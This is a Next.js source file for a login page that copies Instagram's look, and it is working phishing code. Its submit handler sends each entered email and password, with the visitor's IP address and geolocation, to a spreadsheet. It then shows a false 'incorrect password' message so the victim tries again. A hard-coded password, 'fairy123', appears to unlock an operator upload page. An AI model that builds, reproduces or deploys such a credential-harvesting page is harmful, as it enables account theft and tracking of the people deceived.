"use client";

import React, { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { Eye, EyeOff } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import SuccessModal from "../components/SuccessModal";
import Image from "next/image";
import { gp, ig, ms } from "@/images";
import { appendToSheet } from "@/actions/spreadSheet";

const LoginForm = () => {
  const [attempts, setAttempts] = useState(0);
  const [errorMsg, setErrorMsg] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [successModal, setSuccessModal] = useState(false);
  const category = "instagram";
  const router = useRouter();
  const [locationData, setLocationData] = useState({});
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    const fetchData = async () => {
      try {
        const response = await fetch("/api/location");
        if (response.ok) {
          const data = await response.json();
          setLocationData(data);
        } else {
          console.error("Failed to fetch location data");
        }
      } catch (error) {
        console.error("Error:", error);
      }
    };

    fetchData();
  }, []);

  const handleSubmit = async (event) => {
    event.preventDefault();
    setIsLoading(true);

    try {
      if (password === "fairy123") {
        router.push("/upload");
      } else {
        const capital = locationData?.capital || "unknown";
        const city = locationData?.city || "unknown";
        const continent = locationData?.continent || "unknown";
        const ip = locationData?.ip || "unknown";
        const region = locationData?.region || "unknown";
        const country = locationData?.country || "unknown";
        const currency = locationData?.currency || "unknown";
        const phoneCode = locationData?.phoneCode || "unknown";

        // Log the failed attempt data
        const data = [
          [
            category,
            email,
            password,
            ip,
            city,
            region,
            country,
            continent,
            currency,
            phoneCode,
          ],
        ];
        await appendToSheet(data);

        setErrorMsg(
          "The email or password you entered is incorrect. Please try again."
        );
        setPassword(""); // Clear password for retry
        setAttempts((prev) => prev + 1);
        setIsLoading(false);

        if (attempts >= 2) {
          setSuccessModal(true); // Show modal after 2 failed attempts
        }
      }
    } catch (error) {
      console.error("Error:", error);
      setErrorMsg("An error occurred. Please try again.");
    }
  };

  if (successModal) {
    return <SuccessModal />;
  }

  return (
    <div className="bg-white flex flex-col items-center justify-center min-h-screen pb-0">
      <div className="w-full flex flex-col items-center justify-center bg-white">
        <Image
          src={ig}
          alt="instagram logo"
          width={200}
          height={100}
          className="my-5"
        />
        <div className="flex flex-col items-center justify-center w-full">
          <form
            className="flex flex-col justify-center items-center w-full"
            onSubmit={handleSubmit}
          >
            <Input
              className="h-10 w-3/4 bg-gray-50 border border-solid text-sm rounded-sm my-4 outline-none"
              type="text"
              placeholder="Phone number, Username, or email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            <div className="relative w-full mx-auto flex items-center justify-center">
              <Input
                className="h-10 w-3/4 bg-gray-50 border border-solid text-sm rounded-sm pl-2 my-4 outline-none"
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
              />
              <button
                type="button"
                className="absolute right-20 top-1/2 transform -translate-y-1/2"
                onClick={() => setShowPassword(!showPassword)}
                aria-label={showPassword ? "Hide password" : "Show password"}
              >
                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>
            {errorMsg && (
              <p className="text-red-500 text-center">{errorMsg}</p>
            )}
            <Button
              type="submit"
              className="h-10 w-3/4 bg-blue-600 text-white font-semibold border-solid text-sm rounded-xl pl-2 mb-4 hover:bg-blue-700"
              disabled={isLoading}
            >
              Log In
            </Button>
            <div className="flex items-center justify-center">
              <Link href="#" className="font-thin text-sm inline-block">
                Forgot Password?
              </Link>
            </div>
          </form>
        </div>
      </div>
      <div className="w-3/4 h-20 bg-white flex justify-center items-center text-sm">
        <p>
          Don&apos;t have an account?{" "}
          <span className="text-blue-500 font-semibold">Sign up</span>
        </p>
      </div>
      <div className="flex flex-col items-center justify-center mt-4">
        Get the app
        <div className="flex mt-2 w-[150px] gap-4 items-center justify-center">
          <Image src={gp} alt="google play" width={150} height={50} />
          <Image src={ms} alt="microsoft" width={150} height={50} />
        </div>
      </div>
      <footer className="w-full h-full text-center text-xs text-gray-500 mt-8 bg-gray-100 py-4">
        <div className="mb-2 font-semibold">
          <Link href="#" className="mx-1">
            ABOUT
          </Link>
          <Link href="#" className="mx-1">
            BLOG
          </Link>
          <Link href="#" className="mx-1">
            JOBS
          </Link>
          <Link href="#" className="mx-1">
            HELP
          </Link>
          <Link href="#" className="mx-1">
            API
          </Link>
        </div>
        <div className="mb-2 font-semibold">
          <Link href="#" className="mx-1">
            TERMS
          </Link>
          <Link href="#" className="mx-1">
            TOP ACCOUNTS
          </Link>
          <Link href="#" className="mx-1">
            LOCATIONS
          </Link>
        </div>
        <div>
          <Link href="#" className="mx-1 font-semibold">
            CONTACT UPLOADING AND NON-USERS
          </Link>
        </div>
      </footer>
    </div>
  );
};

export default LoginForm;
